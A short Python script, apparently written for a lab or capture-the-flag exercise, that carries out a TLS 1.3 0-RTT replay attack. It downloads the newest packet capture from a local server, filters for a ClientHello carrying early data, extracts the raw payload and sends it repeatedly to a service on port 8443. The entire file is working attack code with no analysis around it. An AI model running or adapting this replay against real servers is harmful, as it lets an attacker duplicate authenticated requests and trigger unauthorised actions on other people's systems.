#!/usr/bin/python3.6
import urllib.request
import re 
from datetime import datetime
import pyshark
import socket
import time

HOST = '127.0.0.1'
PORT = 8443
PCAP_PATH="http://localhost:8080/pcap/"


page = urllib.request.urlopen(PCAP_PATH).read()
pcapFiles = page.decode().replace('\r\n<','^').split('^')
newest = datetime.now().replace(minute = 0, hour = 0, day = 1)
latestPcap = ''
for line in pcapFiles:
    #this may not work at the start of a month. If you hit problems, mangle as needed
    dateStr = re.search (r'\d{2}-[a-zA-Z]{3}-\d{4} \d{2}:\d{2}' ,line )
    if not dateStr:
        continue
    fileName = re.search (r'teletraan-1-\d{2}\.pcap', line)
    if not fileName:
        continue
    date = datetime.strptime(dateStr.group(), '%d-%b-%Y %H:%M')
    if date > newest:
        newest = date
        latestPcap = fileName.group()

print ('downloading ' +latestPcap)
pcapFile = urllib.request.urlretrieve(PCAP_PATH + latestPcap, latestPcap)
pcap = pyshark.FileCapture(latestPcap, display_filter = '(((ssl.record.content_type == 22) && (ssl.record.content_type == 20)) && (ssl.record.opaque_type == 23)) && (ssl.handshake.type == 1)')
# we should be able to use proper list behaviours here, but pyshark has some issues
i = -1
for idx, packet in enumerate (pcap):
    #print (pcap[i])
    #print (i)
    i +=1

payloadHex = (str(pcap[i].tcp.payload)).replace(':', '')
#print (payloadHex)
payload = bytearray.fromhex(payloadHex)
#print (payload)
#print (pcap[1])
#else:
#    print ("there are no 0-RTT packets in the latest capture. create a new new user, or wait and try again")

for i in range (1, 100):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))
        s.sendall(payload)
        time.sleep(0.2)
